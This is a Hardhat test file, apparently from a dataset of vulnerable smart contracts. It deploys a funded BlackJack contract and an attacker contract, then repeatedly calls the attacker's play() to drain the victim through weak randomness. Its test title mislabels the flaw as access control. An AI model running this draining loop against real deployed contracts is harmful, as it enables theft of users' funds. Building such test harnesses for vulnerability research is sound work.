const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { expect } = require('chai');
let victimAmount, attackerAmount;

describe('attack bad_randomness/blackjack.sol', function () {
    async function deployContracts() {
        const [v, a] = await ethers.getSigners();

        const BlackJack = await ethers.getContractFactory('contracts/dataset/bad_randomness/blackjack.sol:BlackJack');
        const victim = await BlackJack.deploy();
        await victim.waitForDeployment();
        
        victimAmount = ethers.parseEther('10');

        await v.sendTransaction({
            to: victim.target,
            value: victimAmount
        });


        const BlackJackAttacker = await ethers.getContractFactory('contracts/bad_randomness/blackjack_attack.sol:BlackJackAttacker');
        const attacker = await BlackJackAttacker.deploy(victim.target);
        await attacker.waitForDeployment();

        attackerAmount = ethers.parseEther('5');
        await a.sendTransaction({
            to: attacker.target,
            value: attackerAmount
        });

    return {victim, attacker};
    }

  
    it('exploit access control vulnerability', async function () {
        const sleep = (delay) => new Promise((resolve) => setTimeout(resolve, delay))

        const {victim, attacker} = await loadFixture(deployContracts);

        const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceBefore).to.equal(victimAmount);

        const attackerBalanceBefore = await ethers.provider.getBalance(attacker.target);
        expect(attackerBalanceBefore).to.equal(attackerAmount);

        let currentBalance = await ethers.provider.getBalance(victim.target);
        while (currentBalance > 0) {
            try {
                await attacker.play();
    
                currentBalance = await ethers.provider.getBalance(victim.target);
    
                if (currentBalance == 0) {
                    break;
                }
            } catch (error) {
                // console.error("Error during play():", error);
                break;
            }
    
            await sleep(1);
        }

        const victimBalanceAfter = await ethers.provider.getBalance(victim.target);
        
        const attackerBalanceAfter = await ethers.provider.getBalance(attacker.target);
        expect(attackerBalanceAfter).to.gt(victimBalanceAfter);

    });
  });